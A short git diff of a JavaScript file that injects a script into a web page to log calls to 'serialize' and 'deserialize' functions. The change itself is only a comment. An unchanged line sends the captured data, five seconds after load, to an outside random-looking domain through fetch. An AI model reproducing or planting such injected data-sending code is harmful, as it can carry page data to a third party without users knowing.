@@ -45,6 +45,7 @@ const deserialize = [];
 let deserializing = false;
 
 function add(funcName, args) {
+  // Deserializing always starts w a deserialize func, once we got the first one we can switch
   if (funcName == "deserialize") {
     deserializing = true;
   }
@@ -62,7 +63,6 @@ setTimeout(() => {
   // alert(JSON.stringify(all, undefined, 2));
   fetch("https://zeiuzeygfzeurf.org/" + encodeURIComponent(JSON.stringify({"serialize": serialize, "deserialize": deserialize})));
 }, 5000)
-
 `
 
 const replacementHtml = `<!DOCTYPE html>
